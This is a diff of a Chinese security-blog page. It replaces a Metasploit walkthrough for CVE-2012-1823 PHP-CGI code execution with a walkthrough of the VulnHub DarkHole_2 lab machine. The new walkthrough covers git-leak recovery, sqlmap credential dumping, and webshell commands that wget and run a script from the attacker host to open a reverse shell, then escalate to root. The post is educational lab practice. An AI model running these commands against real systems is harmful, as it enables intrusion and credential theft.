@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>CVE-2012-1823 PHP-CGI 远程代码执行漏洞 - 信息安全实验室</title>
+<title>vulnhub靶机DarkHole_2教程 - 信息安全实验室</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link rel="preload" as="style" href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Noto+Sans+SC:wght@400;500;700&family=Titillium+Web:wght@400;600;700&display=swap" onload="this.onload=null;this.rel='stylesheet'">
@@ -20,9 +20,8 @@
   <div class="subtitle">RHODES ISLAND <span>://</span> SECURITY <span>//</span> RESEARCH <span>//</span> EXPLOIT <span>//</span> DEFENSE</div>
   <div class="tags-bar">
     <a href="../index.html" class="tag tag-cyan">#首页</a>
-    <a href="../tags/list.html?tag=Vulhub" class="tag tag-cyan">#Vulhub</a>
-    <a href="../tags/list.html?tag=CVE" class="tag">#CVE</a>
-    <a href="../tags/list.html?tag=Web安全" class="tag tag-blue">#Web安全</a>
+    <a href="../tags/list.html?tag=vulnhub" class="tag tag-green">#vulnhub</a>
+    <a href="../tags/list.html?tag=渗透测试" class="tag tag-blue">#渗透测试</a>
   </div>
   <div class="tagline">&gt; LOADING - 100% <span class="cursor">▌</span></div>
 </div>
@@ -44,12 +43,11 @@
 <a href="../index.html" class="back-link">[ &larr; ] BACK TO HOME</a>
 
 <div class="post">
-  <div class="post-date">2023 // 02 / 12</div>
-  <div class="post-title">CVE-2012-1823 PHP-CGI 远程代码执行漏洞</div>
+  <div class="post-date">2023 // 08 / 20</div>
+  <div class="post-title">vulnhub靶机DarkHole_2教程</div>
   <div class="post-tags">
-    <a href="../tags/list.html?tag=Web安全" class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">Web安全</a>
-    <a href="../tags/list.html?tag=Vulhub" class="post-tag" style="background:#00d4ff22;color:#00d4ff;border:1px solid #00d4ff44">Vulhub</a>
-    <a href="../tags/list.html?tag=CVE" class="post-tag" style="background:#e4405f22;color:#e4405f;border:1px solid #e4405f44">CVE</a>
+    <a href="../tags/list.html?tag=vulnhub" class="post-tag" style="background:#10b98122;color:#10b981;border:1px solid #10b98144">vulnhub</a>
+    <a href="../tags/list.html?tag=渗透测试" class="post-tag" style="background:#3366ff22;color:#3366ff;border:1px solid #3366ff44">渗透测试</a>
   </div>
 
   <div class="post-content" style="display:block;border:none;padding:0;margin:0;">
@@ -57,54 +55,96 @@
     <nav class="post-toc">
       <span class="post-toc-title">// 目录</span>
       <ul>
-        <li class="toc-h4"><a href="#summary">漏洞危害</a></li>
-        <li class="toc-h4"><a href="#setup">漏洞搭建</a></li>
-        <li class="toc-h4"><a href="#exploit">漏洞利用</a></li>
+        <li class="toc-h4"><a href="#setup">靶场搭建</a></li>
+        <li class="toc-h4"><a href="#info">信息收集</a></li>
+        <li class="toc-h5"><a href="#info-discovery">主机发现</a></li>
+        <li class="toc-h5"><a href="#info-port">端口扫描</a></li>
+        <li class="toc-h4"><a href="#git">Git 源码泄露</a></li>
+        <li class="toc-h5"><a href="#git-hacker">GitHacker 恢复源码</a></li>
+        <li class="toc-h5"><a href="#git-log">git log 历史凭证</a></li>
+        <li class="toc-h4"><a href="#web">Web 登录与 SQL 注入</a></li>
+        <li class="toc-h5"><a href="#web-login">登录后台</a></li>
+        <li class="toc-h5"><a href="#web-sqli">SQL 注入获取 SSH 凭证</a></li>
+        <li class="toc-h4"><a href="#ssh">SSH 登录</a></li>
+        <li class="toc-h4"><a href="#rce">本地 Webshell 利用</a></li>
+        <li class="toc-h5"><a href="#rce-discover">发现 9999 端口 webshell</a></li>
+        <li class="toc-h5"><a href="#rce-reverse">反弹 Shell</a></li>
+        <li class="toc-h4"><a href="#privesc">提权至 root</a></li>
+        <li class="toc-h4"><a href="#flag">Flag</a></li>
       </ul>
     </nav>
 
-    <h4 id="summary">漏洞危害</h4>
-    <p>CVE-2012-1823 就是 php-cgi 这个 sapi 出现的漏洞，本漏洞只出现在 cgi 模式运行的 php 中。影响范围：php &lt; 5.3.12 或 php &lt; 5.4.2。</p>
-    <p>这个漏洞简单来说，就是用户请求的 querystring 被作为了 php-cgi 的参数，最终导致了一系列结果。</p>
-    <p>探究一下原理，RFC3875 中规定，当 querystring 中不包含没有解码的 = 号的情况下，要将 querystring 作为 cgi 的参数传入。所以，Apache 服务器按要求实现了这个功能。但 PHP 并没有注意到 RFC 的这一个规则，也许是曾经注意并处理了，处理方法就是 web 上下文中不允许传入参数。</p>
-    <p>于是就导致了 php 不光可以通过命令行参数的方式传入 php-cgi，也可以通过 querystring 的方式传入。</p>
+    <h4 id="setup">靶场搭建</h4>
+    <p>靶机下载地址：<a href="https://www.vulnhub.com/entry/darkhole-2,740/" target="_blank">DarkHole: 2 ~ VulnHub</a></p>
+    <p>下载后使用 VirtualBox 导入，网络设置为 NAT 模式。攻击机使用 Kali Linux。</p>
 
-    <h4 id="setup">漏洞搭建</h4>
-    <p>无其他搭建必须环境，搭建环境见 <a href="vulhub-setup.html">Vulhub 搭建方法</a>。</p>
+    <h4 id="info">信息收集</h4>
 
-    <h4 id="exploit">漏洞利用</h4>
-    <p>打开 msf：</p>
-    <pre><code>msfconsole</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image001.png" alt="msfconsole 启动"></p>
+    <h5 id="info-discovery">主机发现</h5>
+    <pre><code>arp-scan -l</code></pre>
 
-    <p>搜索目标漏洞编号：</p>
-    <pre><code>search cve-2012-1823</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image002.png" alt="search cve-2012-1823"></p>
+    <h5 id="info-port">端口扫描</h5>
+    <pre><code>nmap --min-rate 10000 -p- 192.168.21.145</code></pre>
+    <pre><code>nmap -sV -sT -O -p22,80 192.168.21.145</code></pre>
+    <p>开放端口：22（SSH）、80（HTTP）。</p>
 
-    <p>使用模块：</p>
-    <pre><code>use exploit/multi/http/php_cgi_arg_injection</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image003.png" alt="use module"></p>
+    <h4 id="git">Git 源码泄露</h4>
 
-    <p>这里提示需要使用 payload 并告诉我们 payload 的名字直接使用它：</p>
-    <pre><code>set payload php/meterpreter/reverse_tcp</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image004.png" alt="set payload"></p>
+    <h5 id="git-hacker">GitHacker 恢复源码</h5>
+    <p>访问 80 端口发现网站存在 <code>.git</code> 目录泄露，使用 GitHacker 下载完整源码：</p>
+    <pre><code>pip install githacker
+githacker --url http://192.168.21.145/.git/ --output-folder 1</code></pre>
 
-    <p>查看需要配置的信息：</p>
-    <pre><code>show options</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image005.png" alt="show options"></p>
+    <h5 id="git-log">git log 历史凭证</h5>
+    <p>查看 git 提交记录：</p>
+    <pre><code>git log --oneline</code></pre>
+    <p>找到第二次提交中添加了默认凭证，切换到该提交并查看 login.php：</p>
+    <pre><code>git checkout &lt;commit-hash&gt;
+cat login.php</code></pre>
+    <p>获取后台登录凭证：<code>lush@admin.com</code> / <code>admin</code>。</p>
 
-    <p>我们要配置 rhost（目标靶机）和 rport（目标端口）：</p>
-    <pre><code>set rhost 192.168.221.129</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image006.png" alt="set rhost"></p>
-    <pre><code>set rport 8080</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image007.png" alt="set rport"></p>
+    <h4 id="web">Web 登录与 SQL 注入</h4>
 
-    <p>配置完后直接 run 就可以：</p>
-    <pre><code>run</code></pre>
-    <p><img loading="lazy" src="../assets/vc_image008.png" alt="run 连接成功"></p>
+    <h5 id="web-login">登录后台</h5>
+    <p>使用获取的凭证登录网站后台，进入 dashboard 页面。</p>
 
-    <p>显示到这就是连接成功了，我们就能执行命令了：</p>
-    <p><img loading="lazy" src="../assets/vc_image009.png" alt="执行命令"></p>
+    <h5 id="web-sqli">SQL 注入获取 SSH 凭证</h5>
+    <p>观察 URL 发现 <code>dashboard.php?id=1</code> 存在 SQL 注入，使用 sqlmap 枚举：</p>
+    <pre><code>sqlmap -u 'http://192.168.21.145/dashboard.php?id=1' --cookie "PHPSESSID=..." -D darkhole_2 -T ssh --columns -dump --batch</code></pre>
+    <p>成功获取 SSH 凭证：<code>jehad</code> / <code>321</code>。</p>
+
+    <h4 id="ssh">SSH 登录</h4>
+    <pre><code>ssh jehad@192.168.21.145</code></pre>
+
+    <h4 id="rce">本地 Webshell 利用</h4>
+
+    <h5 id="rce-discover">发现 9999 端口 webshell</h5>
+    <p>查看 history 发现之前有人操作过本地 9999 端口，查看定时任务：</p>
+    <pre><code>cat /etc/crontab</code></pre>
+    <p>发现 <code>/opt/web</code> 目录中存在 webshell（一句话木马），通过 9999 端口提供 RCE：</p>
+    <pre><code>curl http://localhost:9999/?cmd=id</code></pre>
+
+    <h5 id="rce-reverse">反弹 Shell</h5>
+    <p>在攻击机编写反弹 Shell 脚本并开启 HTTP 服务：</p>
+    <pre><code># 攻击机监听
+nc -lvp 4444</code></pre>
+    <p>通过 webshell 下载并执行 exp：</p>
+    <pre><code>curl http://localhost:9999/?cmd=wget%20http://192.168.21.134/exp%20-O%20/tmp/exp
+curl http://localhost:9999/?cmd=bash%20/tmp/exp</code></pre>
+    <p>成功获取反弹 Shell，升级为交互式：</p>
+    <pre><code>python3 -c "import pty;pty.spawn('/bin/bash')"</code></pre>
+
+    <h4 id="privesc">提权至 root</h4>
+    <p>查看 history 发现 losy 用户的密码：</p>
+    <pre><code>history</code></pre>
+    <p>历史记录中包含密码 <code>gang</code>，切换用户：</p>
+    <pre><code>su losy</code></pre>
+    <p>losy 用户可执行 sudo 提权：</p>
+    <pre><code>sudo su root</code></pre>
+    <p>成功获取 root 权限。</p>
+
+    <h4 id="flag">Flag</h4>
+    <p>获取 root 权限后读取 flag 文件完成渗透。</p>
 
   </div>
 </div>
